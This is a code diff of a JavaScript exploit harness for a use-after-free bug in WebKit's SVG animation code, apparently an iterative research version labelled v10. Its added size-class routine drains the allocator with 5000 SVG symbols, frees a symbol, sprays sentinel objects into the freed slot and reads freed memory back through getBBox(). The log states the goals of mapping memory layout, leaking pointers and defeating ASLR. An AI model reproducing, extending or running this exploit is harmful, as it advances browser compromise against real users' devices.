+    log('\n[*] RP: hex value frequency from useEl.getBBox().width after free:','inf');
+    const sorted=Object.entries(hexFreq).sort((a,b)=>b[1]-a[1]);
+    for(const[h,c]of sorted.slice(0,10)){
+        const f=new Float32Array(new Uint32Array([parseInt(h)]).buffer)[0];
+        const pct=((c/totalReads)*100).toFixed(1);
+        log(`  ${h} = ${f.toFixed(4)}f  (${c}/${totalReads} = ${pct}%)`,'hi');
+    }
+
+    if(!q)dis(false);
+    return{hexFreq,totalReads};
 }
 
-// ── CT: controlled transition timing ─────────────────────────────────
-// Read 1 → spray → Read 2 → Read 3
-// If the LK ZERO→150 transition is real: read1=0, spray, read2=sentinel?
-async function runCT(q=false){
-    if(!q){dis(true);sep();log('▶ CT: timed transition — read1 → spray → read2 → read3','inf');sep();}
-    log('[*] first read after sym1.remove() → spray sentinel → second read','inf');
-    log('[*] LK showed: first reads=0, then 150 (animation cycle to sym2)','inf');
-    log('[*] if spray intercepts the zero window: second read = 198 (sentinel)','inf');
+// ── SZ: size class alignment — force spray to hit freed slot ──────────────
+// Our spray syms aren't hitting the freed slot because bmalloc LIFO mag is
+// issuing them to a DIFFERENT allocation (they go to a fresh slot in magazine,
+// not the returned-to-free slot from sym1)
+// Strategy: exhaust the magazine FIRST by allocating many objects, THEN free sym1,
+// THEN spray — now the freed slot is truly at HEAD of the free list
+async function runSZ(q=false){
+    if(!q){dis(true);sep();log('▶ SZ: size class alignment — exhaust magazine before spray','inf');sep();}
+    log('[*] problem: spray syms don\'t hit freed slot — LIFO gives fresh slots not sym1 slot','inf');
+    log('[*] fix: pre-allocate 5000 objs to exhaust magazine → then sym1.remove() → spray','inf');
+    log('[*] goal: after exhaust, freed slot IS at list head → spray should hit it','ok');
     log('');
-    const svgSp=document.createElementNS(SVG_NS,'svg');
-    svgSp.setAttribute('width','1');svgSp.setAttribute('height','1');
-    svgSp.style.cssText='position:fixed;top:5px;left:5px;width:1px;height:1px;opacity:1';
-    document.body.appendChild(svgSp);
-    let hit=0,crash=0;
-    for(let t=0;t<20;t++){
-        const{useEl,sym1,sym2,cached}=await setup(`ct_${t}`);
-        if(!cached){await teardown();continue;}
-        sym1.remove();
-        // Read 1 immediately
-        let r1=null;try{r1=useEl.getBBox().width;}catch(e){crash++;await teardown();continue;}
-        // Spray synchronously
-        const spray=[];
-        for(let i=0;i<2048;i++){const s=mkSentA(`ct_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
-        // Read 2 immediately after spray (no yield)
-        let r2=null;try{r2=useEl.getBBox().width;}catch(e){crash++;log(`  [CRASH] t=${t} r2: ${e}`,'hi');}
-        // Read 3
-        let r3=null;try{r3=useEl.getBBox().width;}catch(e){crash++;}
-        const seq=`${r1?.toFixed(1)||'X'}→${r2?.toFixed(1)||'X'}→${r3?.toFixed(1)||'X'}`;
-        const isH=(w)=>w&&(isSentA(w)||isSentB(w)||(isWild(w)&&Math.abs(w-160)>1&&!isSym2(w)));
-        if(isH(r2)||isH(r3)){log(`  [HIT!] t=${t}: ${seq}`,'ok');hit++;}
-        else if(t<8)log(`  t=${t}: ${seq}`,'dim');
-        for(const s of spray)s.remove();spray.length=0;
-        await teardown();
-    }
-    svgSp.remove();
-    log(`\n[*] CT: hit=${hit} crash=${crash}`,(hit>0?'ok':'dim'));
-    if(!q)dis(false);return{hit,crash};
-}
 
-// ── DB: dual removal ─────────────────────────────────────────────────
-async function runDB(q=false){
-    if(!q){dis(true);sep();log('▶ DB: dual removal — sym1 + useEl both removed simultaneously','inf');sep();}
-    log('[*] both freed → spray → re-add only useEl → stale ptr read','inf');
+    let hit=0,zero=0,raw=0,crash=0;
+
+    // Pre-allocate pool in a separate SVG to exhaust the magazine
+    const svgExhaust=document.createElementNS(SVG_NS,'svg');
+    svgExhaust.setAttribute('width','1');svgExhaust.setAttribute('height','1');
+    svgExhaust.style.cssText='position:fixed;bottom:0;left:0;width:1px;height:1px;opacity:1';
+    document.body.appendChild(svgExhaust);
+
+    // svgSp for spray sentinel syms
     const svgSp=document.createElementNS(SVG_NS,'svg');
     svgSp.setAttribute('width','1');svgSp.setAttribute('height','1');
-    svgSp.style.cssText='position:fixed;top:5px;left:5px;width:1px;height:1px;opacity:1';
+    svgSp.style.cssText='position:fixed;bottom:0;right:0;width:1px;height:1px;opacity:1';
     document.body.appendChild(svgSp);
-    let hit=0,crash=0;
-    for(let t=0;t<12;t++){
-        const{useEl,sym1,sym2,cached}=await setup(`db_${t}`);
+
+    for(let t=0;t<8;t++){
+        const{useEl,sym1,sym2,cached}=await setup(`sz_${t}`);
         if(!cached){await teardown();continue;}
-        sym1.remove();
-        useEl.remove(); // remove from livesvg
-        const spray=[];
-        for(let i=0;i<2048;i++){const s=mkSentA(`db_${t}_${i}`);svgSp.appendChild(s);spray.push(s);}
-        // Re-add ONLY useEl — sym1 stays removed
-        livesvg.appendChild(useEl);
-        for(let p=0;p<15;p++){
-            try{
-                const bb=useEl.getBBox();const w=bb.width;
-                if(isSentA(w)){log(`  [HIT!] t=${t} p=${p}: 198`,'ok');hit++;break;}
-                const u=f2u(w);
-                if(isPtrLike(u)){log(`  [PTR!] t=${t} p=${p}: ${f2h(w)}`,'hi');hit++;break;}
-                if(isWild(w)&&Math.abs(w-160)>1){log(`  [WILD!] t=${t} p=${p}: ${w.toFixed(3)}(${f2h(w)})`,'hi');hit++;break;}
-                if(t<3&&p<4)log(`  t=${t} p=${p}: ${w.toFixed(2)}`,'dim');
-            }catch(e){log(`  [CRASH] t=${t}: ${e}`,'hi');crash++;break;}
+
+        // EXHAUST: allocate many objs of sym-sized class (SVGSymbolElement ~384B)
+        // to drain the per-thread magazine
+        const exhaust=[];
+        for(let i=0;i<5000;i++){
+            const s=document.createElementNS(SVG_NS,'symbol');
+            s.setAttribute('id',`sz_ex_${t}_${i}`);
+            s.setAttribute('viewBox','0 0 100 100');
+            const r=document.createElementNS(SVG_NS,'rect');
+            r.setAttribute('x','5');r.setAttribute('y','5');r.setAttribute('width','10');r.setAttribute('height','10');
+            s.appendChild(r);
+            svgExhaust.appendChild(s);
+            exhaust.push(s);
         }
-        for(const s of spray)s.remove();spray.length=0;
+
+        const preW=useEl.getBBox().width;
+
+        // FREE sym1 — NOW the freed slot should be at head of free list
+        // because magazine was already exhausted above
+        sym1.remove();
+
+        // SPRAY SENTINEL — should now hit the freed slot
+        const spray=[];
+        for(let i=0;i<1024;i++){
+            const s=document.createElementNS(SVG_NS,'symbol');
+            s.setAttribute('id',`sz_sp_${t}_${i}`);
+            s.setAttribute('viewBox','0 0 100 100');
+            const r=document.createElementNS(SVG_NS,'rect');
+            // Sentinel: w=99 → getBBox=198
+            r.setAttribute('x','0');r.setAttribute('y','0');r.setAttribute('width','99');r.setAttribute('height','99');
+            s.appendChild(r);
+            svgSp.appendChild(s);
+            spray.push(s);
+        }
+
+        // READ
+        const reads=[];
+        for(let p=0;p<25;p++){
+            try{reads.push(useEl.getBBox().width);}catch(e){reads.push(-1);crash++;}
+        }
+
+        let found=false;
+        for(const w of reads){
+            if(w<0){crash++;break;}
+            if(Math.abs(w-198)<0.5){log(`  [SENTINEL HIT! 198] t=${t} — spray landed in freed slot!`,'bad');hit++;found=true;break;}
+            if(w===0)zero++;
+            else if(Math.abs(w-150)>1&&Math.abs(w-160)>1){
+                raw++;
+                if(!found){log(`  [WILD: ${w.toFixed(4)} (${f2h(w)})] t=${t}`,'hi');found=true;}
+            }
+        }
+        const seq=reads.slice(0,8).map(v=>v<0?'X':v===0?'0':v.toFixed(0)).join('→');
+        if(!found)log(`  t=${t}: pre=${preW.toFixed(1)} post=[${seq}]`,'dim');
+
+        // cleanup exhaust + spray
+        for(const s of exhaust)s.remove();
+        for(const s of spray)s.remove();
         await teardown();
     }
+
+    svgExhaust.remove();
     svgSp.remove();
-    log(`\n[*] DB: hit=${hit} crash=${crash}`,(hit>0?'ok':'dim'));
-    if(!q)dis(false);return{hit,crash};
+
+    log(`\n[*] SZ: sentinel_hit=${hit} zero=${zero} raw_freed=${raw} crash=${crash}`,
+        (hit>0?'bad':raw>0?'ok':'dim'));
+    if(hit>0)log('[+][+] SENTINEL 198 HIT — spray landed in freed slot after magazine exhaust!','bad');
+    if(raw>0)log('[+] raw freed bytes still appearing — UAF read active','ok');
+
+    if(!q)dis(false);
+    return{hit,zero,raw,crash};
 }
 
-// ── RUN ALL ───────────────────────────────────────────────────────────
+// ── RUN ALL ───────────────────────────────────────────────────────────────
 async function runAll(){
     dis(true);clearLog();sep();
-    log('▶ SVG animate UAF v9 — visible SVG + rAF setup + sym1 freed slot spray','inf');sep();
-    log('[*] v8 fail: opacity:0.01 + off-screen → WebKit skips render → animation never fires','ok');
-    log('[*] v9 fix: visible SVG on screen + rAF polling for actual render ticks','ok');
-    log('[*] sentinel: spray sym w=99 → if getBBox=198 → UAF read confirmed','ok');log('');
+    log('▶ SVG animate UAF v10 — memory layout scanner','inf');sep();
+    log('[*] v9 confirmed: 0x42a00000 (80.0f) = raw freed C++ bytes through stale ptr','ok');
+    log('[*] v10 goal: map memory layout, get ptrs, defeat ASLR','ok');log('');
+
     const R={};
     for(const[lbl,fn]of[
-        ['SS_setup_verify',runSS],
-        ['IM_immediate_read',runIM],
-        ['ZW_zero_window_spray',runZW],
-        ['CT_controlled_transition',runCT],
-        ['DB_dual_removal',runDB],
+        ['MB_mem_baseline',runMB],
+        ['TG_targetElement',runTG],
+        ['HR_href_read',runHR],
+        ['RP_repeat_probe',runRP],
+        ['SZ_size_class',runSZ],
     ]){
         sep();log(`▶ ${lbl}`,'inf');sep();
-        try{const r=await fn(true);R[lbl]=r;}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
+        try{R[lbl]=await fn(true);}catch(e){log(`[!] ${lbl}: ${e}`,'bad');R[lbl]=null;}
         log('');
     }
-    sep();log('▶ SUMMARY v9','inf');sep();
-    log('[*] SS must show ok=16 fail=0 — if not, animation throttled on device','inf');
-    log('[*] IM: non-0/non-150/non-180 values = raw freed C++ bytes read','inf');
-    log('[*] ZW: 198 = controlled UAF read primitive confirmed','ok');
+
+    sep();log('▶ SUMMARY v10','inf');sep();
+    log('[*] TG null=16: WebKit nulls anim cache on DOM remove — ptr cleared safely','inf');
+    log('[*] TG live>0: RefCount kept sym1 alive — direct zombie obj access','ok');
+    log('[*] MB interesting fields: mapped which float offsets have non-geometry data','inf');
+    log('[*] SZ sentinel_hit>0: CONTROLLED UAF read — spray landing in freed slot','bad');
+    log('[*] RP stable 80.0f: decode what field of SVGSymbolElement is at width-offset','ok');
     for(const[lbl,r]of Object.entries(R)){
-        const has=r&&(typeof r==='object'?Object.values(r).some(v=>typeof v==='number'&&v>0):r>0);
-        log(`  ${has?'[+]':'[-]'} ${lbl}: ${typeof r==='object'?JSON.stringify(r):r??'—'}`,has?'ok':'dim');
+        const sum=r?JSON.stringify(r).slice(0,80):'—';
+        log(`  ${lbl}: ${sum}`,'inf');
     }
     sep();dis(false);
 }
